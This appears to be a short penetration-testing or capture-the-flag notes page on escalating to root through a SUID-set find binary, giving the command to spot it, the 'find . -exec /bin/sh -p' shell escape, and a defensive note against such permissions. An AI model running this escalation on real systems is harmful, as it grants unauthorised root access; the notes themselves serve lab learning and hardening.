# SUID Find Shell Escape

Used on: **Binex**

The `find` utility, if granted the SUID bit, can execute commands with the privileges of the file owner (usually root) by using the `-exec` flag.

## How to Recognize It

- `find / -perm -u=s -type f 2>/dev/null` lists `/usr/bin/find`.

## Prerequisites

- Shell access to the target.
- `find` binary has the SUID bit set (`-rwsr-xr-x`).

## Steps

Execute `find` on any file (e.g., `.`) and pass `/bin/sh -p` to the `-exec` argument. The `-p` flag is critical as it instructs the shell to preserve the effective UID (SUID), preventing it from dropping privileges.

```bash
find . -exec /bin/sh -p \; -quit
```

Verify your privileges:
```bash
whoami
# Should return root or the SUID owner
```

## Defensive Note

Never grant SUID to `find` or other utilities capable of spawning shells (like `awk`, `tar`, `vim`). Use well-scoped `sudo` rules instead.

## Related

- [suid-path-hijack.md](suid-path-hijack.md)
